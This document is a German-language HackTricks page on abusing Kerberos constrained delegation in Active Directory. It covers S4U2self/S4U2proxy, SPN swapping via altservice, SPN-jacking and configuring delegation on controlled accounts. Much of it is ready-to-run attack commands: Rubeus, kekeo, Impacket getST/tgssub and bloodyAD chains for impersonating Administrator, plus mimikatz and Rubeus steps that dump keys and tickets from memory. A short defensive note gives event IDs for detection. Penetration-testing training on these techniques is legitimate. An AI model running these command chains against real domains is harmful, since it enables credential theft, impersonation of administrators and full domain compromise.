# Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Constrained Delegation

Damit kann ein Domain-Administrator einem Computer **erlauben**, sich gegenüber jedem **Service** eines Computers als **Benutzer oder Computer auszugeben**.

- **Service for User to self (_S4U2self_):** Jedes **Service-Konto, das einen SPN besitzt**, kann normalerweise im Namen eines beliebigen Benutzers ein TGS für sich selbst erhalten. Wenn das Konto außerdem über [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D) in _userAccountControl_ verfügt, ist dieses TGS **forwardable**. Dadurch wird der Protokollübergang für die **classic constrained delegation** direkt nutzbar.
- **Service for User to Proxy(_S4U2proxy_):** Ein **Service-Konto** kann im Namen eines Benutzers ein TGS für die in **msDS-AllowedToDelegateTo** aufgeführten SPNs erhalten. Das in S4U2Proxy verwendete Evidence-Ticket muss ein **forwardable** Ticket für den delegierenden Service sein: entweder ein echtes, vom Opfer abgefangenes Client-to-Service-Ticket oder eines, das mit **S4U2Self + T2A4D** generiert wurde.

**Hinweis**: Wenn ein Benutzer in AD als „_Account is sensitive and cannot be delegated_“ markiert ist oder Mitglied von **Protected Users** ist, kannst du dich normalerweise **nicht über constrained delegation als dieser Benutzer ausgeben**. Verwende in modernen Domains beim Angriff auf delegation-enabled Konten bevorzugt **AES**-Material statt von RC4-only auszugehen.

Das bedeutet: Wenn du den **Hash des Service** kompromittierst, kannst du dich als **Benutzer ausgeben** und in dessen Namen **Zugriff** auf jeden **Service** auf den angegebenen Computern erhalten (mögliche **privesc**).

Außerdem erhältst du **nicht nur Zugriff auf den Service, als den sich der Benutzer ausgeben kann, sondern auch auf jeden anderen Service**, da der SPN (der angeforderte Service-Name) nicht überprüft wird (dieser Teil ist im Ticket nicht verschlüsselt/signiert). Wenn du also Zugriff auf den **CIFS service** hast, kannst du beispielsweise mit dem `/altservice`-Flag in Rubeus auch auf den **HOST service** zugreifen. Dieselbe Schwachstelle beim SPN-Swapping wird von **Impacket getST -altservice** und anderen Tools ausgenutzt.

Außerdem wird der **LDAP service-Zugriff auf dem DC** benötigt, um einen **DCSync** durchzuführen.

```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Linux / LDAP enumeration
# NetExec: enumerate constrained / unconstrained / RBCD in one shot
nxc ldap dc.corp.local -u user -p 'Password123!' --find-delegation

# bloodyAD / msldap: LDAP-first enumeration from Linux
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap constrained
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap s4u2proxy
```

**Hinweis für Operatoren:** Verlass dich bei der Prüfung von **gMSA/sMSA** nicht allein auf Screenshots aus **ADUC** oder BloodHound. Bei diesen Konten fehlt häufig die übliche Registerkarte „Delegation“. Ermittle daher die Rohattribute **`userAccountControl`** und **`msDS-AllowedToDelegateTo`** direkt.

```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```

### Protocol-Transition vs. Kerberos-only-Constrained Delegation

Wenn das kompromittierte Konto über **T2A4D** verfügt, kannst du die vollständige **`S4U2Self -> S4U2Proxy`**-Kette normalerweise nur mit dem Service-Key/TGT abschließen.<sup>[[2]](#references)</sup>

Wenn es nur über **`msDS-AllowedToDelegateTo`** verfügt (den klassischen Modus **„Use Kerberos only“**), kann die Delegation dennoch missbrauchbar sein. Das Evidence-Ticket für S4U2Proxy muss jedoch ein **forwardable Benutzer-zu-Service-Ticket** für den delegierenden Service sein. Eine Möglichkeit besteht darin, ein TGS eines Opfers aus **LSASS/ccache** abzugreifen und es der zweiten Phase zuzuführen (`/tgs:` in Rubeus). Ein **non-forwardable** S4U2Self-Ticket reicht für klassische constrained delegation **nicht** aus. Wenn dies dein einziges Evidence-Ticket ist, sieh dir stattdessen [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) an.<sup>[[2]](#references)</sup>

Eine weitere bedingte Möglichkeit ist ein erster [RBCD](resource-based-constrained-delegation.md)-Hop zum delegierenden Service: Wenn dabei ein **forwardable** Ticket für den vorgesehenen Benutzer und Service ausgestellt wird, kann dieses Ticket als Evidence für einen späteren Kerberos-only-S4U2Proxy-Hop getestet werden. Überprüfe die Flags des ersten Tickets, den SPN des delegierenden Service, dessen Ziel-Allowlist und mögliche Delegationseinschränkungen für Benutzer. Die Kontrolle über ein RBCD-Attribut allein belegt nicht, dass der zweite Hop möglich ist.

### Hinweise zu Cross-Domain-Constrained Delegation (2025+)

Seit **Windows Server 2012/2012 R2** unterstützt der KDC **constrained delegation über Domänen-/Forest-Grenzen hinweg** mithilfe von S4U2Proxy-Erweiterungen. Moderne Builds (Windows Server 2016–2025) behalten dieses Verhalten bei und fügen zwei PAC-SIDs hinzu, um Protocol Transition zu kennzeichnen:<sup>[[1]](#references)</sup>

- `S-1-18-1` (**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**), wenn sich der Benutzer normal authentifiziert hat.
- `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**), wenn ein Service die Identität über Protocol Transition bestätigt hat.

Wenn Protocol Transition domänenübergreifend verwendet wird, sollte **SERVICE_ASSERTED_IDENTITY** im PAC enthalten sein. Das bestätigt, dass der S4U2Proxy-Schritt erfolgreich war.<sup>[[1]](#references)</sup>

### Impacket-/Linux-Tools (altservice & vollständiges S4U)

Aktuelle Impacket-Versionen (0.11.x+) stellen dieselbe S4U-Kette und dasselbe SPN-Swapping wie Rubeus bereit:<sup>[[2]](#references)</sup>

```bash
# Get TGT for delegating service (hash/aes)
getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d

# S4U2self + S4U2proxy in one go, impersonating Administrator to CIFS then swapping to HOST
getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
         -impersonate Administrator contoso.local/websvc$ \
         -hashes :8c6264140d5ae7d03f7f2a53088a291d -k -dc-ip 10.10.10.5

# Inject resulting ccache
export KRB5CCNAME=Administrator.ccache
smbclient -k //dc.contoso.local/C$ -c 'dir'

# If you already have a ticket/ccache for the right host, rewrite only the service class offline
# (same SPN-swapping idea as Rubeus /altservice)
tgssub.py -in Administrator.ccache -out Administrator_HOST.ccache -altservice host/dc.contoso.local
export KRB5CCNAME=Administrator_HOST.ccache
```

Wenn du zuerst lieber das Benutzer-ST fälschst (z. B. nur mit einem Offline-Hash), kombiniere **ticketer.py** mit **getST.py** für S4U2Proxy. `tgssub.py` ist ebenfalls nützlich, wenn du bereits über einen funktionierenden ccache verfügst und nur die Service-Klasse für denselben Host ändern musst. Aktuelle Besonderheiten findest du im offenen Impacket-Issue #1713 (KRB_AP_ERR_MODIFIED, wenn das gefälschte ST nicht zum SPN-Schlüssel passt).<sup>[[2]](#references)</sup>

### SPN-jacking: Ein Ziel für constrained delegation umleiten

Classic constrained delegation autorisiert einen **SPN-String** in `msDS-AllowedToDelegateTo`, keine unveränderliche Ziel-SID. Während S4U2Proxy ermittelt der KDC, welchem Konto der SPN derzeit gehört, und verschlüsselt das Service-Ticket mit dem langfristigen Schlüssel dieses Kontos. Daher lässt sich durch Kontrolle des delegierenden Kontos und `WriteSPN`-Berechtigungen für ein anderes Dienst- oder Computerkonto eine unveränderte Delegierungsbeschränkung umleiten, ohne `SeEnableDelegationPrivilege` zu benötigen.<sup>[[5]](#references)[[6]](#references)</sup>

Es gibt zwei Varianten:<sup>[[5]](#references)</sup>

- **Ghost SPN-jacking:** Der erlaubte SPN ist verwaist, weil sein früherer Besitzer gelöscht oder umbenannt wurde oder der SPN entfernt wurde. Füge ihn direkt zum gewünschten Zielkonto hinzu.
- **Live SPN-jacking:** Der SPN gehört weiterhin einem Quellkonto. Die Duplicate-SPN-Validierung verhindert normalerweise das Schreiben auf das Ziel, daher werden `WriteSPN`-Berechtigungen für beide Objekte benötigt: Entferne den SPN von der Quelle, füge ihn zum Ziel hinzu, rufe das Ticket ab und stelle die ursprüngliche Registrierung wieder her.

Der folgende abstrahierte Linux-Ablauf verschiebt einen erlaubten SPN, führt S4U als kompromittierter delegierender Principal aus und schreibt den Dienstnamen des Tickets in einen nützlichen Dienst auf dem neuen Ziel um.<sup>[[5]](#references)[[6]](#references)</sup>

```bash
# Omit this deletion for a ghost SPN
bloodyAD --host "$DC" -d "$DOMAIN" -u "$WRITER" -p "$PASSWORD" \
  msldap delspn "$SOURCE_DN" "$DELEGATED_SPN"

bloodyAD --host "$DC" -d "$DOMAIN" -u "$WRITER" -p "$PASSWORD" \
  msldap addspn "$TARGET_DN" "$DELEGATED_SPN"

getST.py -dc-ip "$DC_IP" -spn "$DELEGATED_SPN" \
  -impersonate Administrator -altservice "cifs/$TARGET_FQDN" \
  "$DOMAIN/$DELEGATING_ACCOUNT:$DELEGATING_PASSWORD"
```

`-altservice` ist die zweite, separate Primitive. Das S4U2Proxy-Ticket wurde für das Konto verschlüsselt, dem `$DELEGATED_SPN` jetzt gehört; da der Dienstname (`sname`) außerhalb des verschlüsselten Ticketinhalts liegt, können Tools eine andere Dienstklasse/einen anderen Hostnamen einsetzen, dessen Dienst denselben Kontoschlüssel verwendet. SPN-Jacking ändert zunächst, **welcher Kontoschlüssel** das Ticket schützt, während die Ersetzung der Dienstklasse ändert, **wo dieses Ticket vorgelegt wird**.<sup>[[5]](#references)[[6]](#references)</sup>

Bei Live-Jacking sollten die beiden LDAP-Schreibvorgänge direkt nach dem Abrufen des Tickets in umgekehrter Reihenfolge ausgeführt werden, damit der legitime Dienst nicht beeinträchtigt wird. Auf DCs mit aktivierter Überwachung von Computerkonten sollte nach dem Security-Ereignis **4742** gesucht werden, bei dem `servicePrincipalName` von einem Computer entfernt und kurz darauf einem anderen hinzugefügt wird – insbesondere, wenn sich der SPN-Hostname von `dNSHostName` des Zielcomputers unterscheidet. Mit Ereignis **4769** korrelieren: S4U2Self verwendet dasselbe Konto als Client/Dienst, während S4U2Proxy **Transited Services** befüllt.<sup>[[5]](#references)</sup>

### Delegation für ein kontrolliertes Konto konfigurieren

Dieser Ansatz erfordert **effektiven Schreibzugriff** auf die Delegierungsattribute des Computer- oder Dienstkontos (zum Beispiel `GenericAll` oder `WriteDACL` gefolgt von einer ACL-Änderung) **und** das Benutzerrecht `SeEnableDelegationPrivilege` für das Konto, das die LDAP-Änderung vornimmt. Microsoft verlangt dieses Recht, wenn `msDS-AllowedToDelegateTo` geändert wird; alleinige Objektkontrollrechte umgehen diese Anforderung nicht. Prüfe beide Voraussetzungen, bevor du einen LDAP-Client wie **bloodyAD** verwendest, um die Delegation mit Protokollübergang einzurichten.<sup>[[Microsoft ADTS modify-operation security checks](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/c714e48c-ea21-48b0-913d-fc065ab3dda3)]</sup>

```bash
# Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
```

Ein vorhandenes Computerkonto kann auch dann infrage kommen, wenn `ms-DS-MachineAccountQuota` null ist; dieses Kontingent beschränkt den standardmäßigen Weg zum Erstellen neuer Computer, nicht die Rechte an einem vorhandenen Objekt. Um die konfigurierte Delegierung zu nutzen, benötigst du außerdem Kontrolle über den Schlüssel oder das Passwort des delegierenden Kontos, einen gültigen Service Principal Name und einen Zielbenutzer, dessen Anmeldedaten delegiert werden dürfen. Diese Bedingungen und die effektiven Verzeichniszugriffsrechte müssen separat geprüft werden.

- Schritt 1: **TGT des erlaubten Dienstes abrufen**

```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```

> [!WARNING]
> Es gibt **andere Möglichkeiten, ein TGT-Ticket** oder **RC4** oder **AES256** zu erhalten, ohne auf dem Computer SYSTEM zu sein, etwa mit Printer Bug und unconstrained delegation, NTLM relaying und Active Directory Certificate Service abuse
>
> **Allein mit diesem TGT-Ticket (oder dem Hash davon) kannst du diesen Angriff ausführen, ohne den gesamten Computer zu kompromittieren.**

- Schritt 2: **TGS für den Dienst abrufen und dabei den Benutzer imitieren**

```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the constrained-delegation user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```

[**Weitere Informationen auf ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) and [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)<sup>[[3]](#references)[[4]](#references)</sup>

## References

- [1] [Kerberos-Übersicht zur eingeschränkten Delegierung (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [2] [Delegierung mit Impacket missbrauchen (Teil 2): Eingeschränkte Delegierung (Black Hills, 2025)](https://www.blackhillsinfosec.com/abusing-delegation-with-impacket-part-2/)
- [3] [Kerberos Constrained Delegation (ired.team)](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)
- [4] [Kerberosity tötete die Domain: Ein offensiver Kerberos-Überblick (SpecterOps)](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [5] [Elad Shamir – SPN-jacking: Ein Sonderfall des WriteSPN-Missbrauchs](https://www.semperis.com/blog/spn-jacking-an-edge-case-in-writespn-abuse/)
- [6] [0xdf – HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
{{#include ../../banners/hacktricks-training.md}}
